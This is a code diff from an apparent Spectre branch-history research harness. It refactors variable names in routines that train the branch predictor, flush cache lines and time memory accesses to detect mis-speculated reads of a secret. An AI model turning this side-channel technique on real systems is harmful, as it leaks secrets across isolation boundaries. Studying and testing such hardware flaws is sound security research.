@@ -23,33 +23,33 @@ uint8_t dummy_secret = 12;
 void *ib_ptr_empty = &t_empty;
 branch_chain_t bh_chain_common;
 
-void goto_chain(branch_chain_t br_chain, uint64_t *bh_targets, void **ib_ptr_p, int nr_cond_bh, void *frbuf, void *ptr_secret, uint64_t ex_argc, char **ex_argv)
+void goto_chain(branch_chain_t br_chain, uint64_t *bh_targets, void **ib_ptr_p, int nr_cond_bh, void *frbuf, void *secret_p, uint64_t ex_argc, char **ex_argv)
 {
     // Populate BHB with conditional branches
     for (int i = 0; i < nr_cond_bh; i++)
         NOP(8);
-    // Populate PHR with indirect branches and trains the BPU
-    br_chain(bh_targets, 0, ex_argv, ib_ptr_p, frbuf, ptr_secret);
+    // Populate PHR with indirect branches and train_chains the BPU
+    br_chain(bh_targets, 0, ex_argv, ib_ptr_p, frbuf, secret_p);
 }
 
 void do_spectre_test(test_obj_t test_specs)
 {
-    uint64_t nr_test_passes = test_specs.nr_test_passes;
+    uint64_t nr_repeat = test_specs.nr_repeat;
     uint64_t nr_train_passes = test_specs.nr_train_passes;
-    uint64_t nr_trains = test_specs.nr_trains;
-    bh_chain_params_t **trains = test_specs.trains;
-    bh_chain_params_t *test = test_specs.test;
+    uint64_t nr_train_chains = test_specs.nr_train_chains;
+    bh_chain_params_t **train_chains = test_specs.train_chains;
+    bh_chain_params_t *test_chain = test_specs.test_chain;
 
-    for (int test_iter = 0; test_iter < nr_test_passes; test_iter++)
+    for (int test_iter = 0; test_iter < nr_repeat; test_iter++)
     {
         for (int train_iter = 0; train_iter < nr_train_passes; train_iter++)
         {
             // Warm-up the BPU
             test_specs.before_train();
             // Train the BPU with desired records
-            for (int train_flow = 0; train_flow < nr_trains; train_flow++)
+            for (int train_flow = 0; train_flow < nr_train_chains; train_flow++)
             {
-                bh_chain_params_t *current = trains[train_flow];
+                bh_chain_params_t *current = train_chains[train_flow];
                 void **ib_ptr_p = current->ib_ptr_p;
                 void *ib_target = current->ib_target;
                 *ib_ptr_p = ib_target;
@@ -58,38 +58,38 @@ void do_spectre_test(test_obj_t test_specs)
                 uint64_t *bh_targets = *(current->bh_targets_p);
                 uint64_t nr_cond_bh = current->nr_cond_bh;
                 void *_frbuf = *(current->frbuf_p);
-                void *ptr_secret = current->ptr_secret;
+                void *secret_p = current->secret_p;
                 uint64_t ex_argc = current->ex_argc;
                 char **ex_argv = current->ex_argv;
-                goto_chain(bh_chain, bh_targets, ib_ptr_p, nr_cond_bh, _frbuf, ptr_secret, ex_argc, ex_argv);
+                goto_chain(bh_chain, bh_targets, ib_ptr_p, nr_cond_bh, _frbuf, secret_p, ex_argc, ex_argv);
             }
         }
 
         // Massage the BPU to a desired state
         test_specs.before_test();
-        void **ib_ptr_p = test->ib_ptr_p;
-        void *ib_target = test->ib_target;
+        void **ib_ptr_p = test_chain->ib_ptr_p;
+        void *ib_target = test_chain->ib_target;
         *ib_ptr_p = ib_target;
 
-        // Run the test and see if we can see the desired mis-speculation
-        branch_chain_t bh_chain = *(test->bh_chain_p);
-        uint64_t *bh_targets = *(test->bh_targets_p);
-        uint64_t nr_cond_bh = test->nr_cond_bh;
-        char *_frbuf = *(test->frbuf_p);
-        char *ptr_secret = test->ptr_secret;
-        uint64_t ex_argc = test->ex_argc;
-        char **ex_argv = test->ex_argv;
+        // Run the test_chain and see if we can see the desired mis-speculation
+        branch_chain_t bh_chain = *(test_chain->bh_chain_p);
+        uint64_t *bh_targets = *(test_chain->bh_targets_p);
+        uint64_t nr_cond_bh = test_chain->nr_cond_bh;
+        char *_frbuf = *(test_chain->frbuf_p);
+        char *secret_p = test_chain->secret_p;
+        uint64_t ex_argc = test_chain->ex_argc;
+        char **ex_argv = test_chain->ex_argv;
 
         FLUSH_DCACHE(ib_ptr_p);
-        FLUSH_DCACHE(SC_ENCODE_ADDR(_frbuf, ptr_secret));
+        FLUSH_DCACHE(SC_ENCODE_ADDR(_frbuf, secret_p));
         for (int i = 0; i < test_specs.nr_dc_flush; i++)
             FLUSH_DCACHE(test_specs.dc_flush_p[i]);
         OPS_BARRIER(0x10);
 
-        goto_chain(bh_chain, bh_targets, ib_ptr_p, nr_cond_bh, _frbuf, ptr_secret, ex_argc, ex_argv);
+        goto_chain(bh_chain, bh_targets, ib_ptr_p, nr_cond_bh, _frbuf, secret_p, ex_argc, ex_argv);
         // Decode side channel to see if we have made it!
         OPS_BARRIER(0x10);
-        res_cycles[test_specs.test_spec][test_iter] = mem_access_time(SC_ENCODE_ADDR(_frbuf, ptr_secret));
+        res_cycles[test_specs.type][test_iter] = mem_access_time(SC_ENCODE_ADDR(_frbuf, secret_p));
     }
 }
 
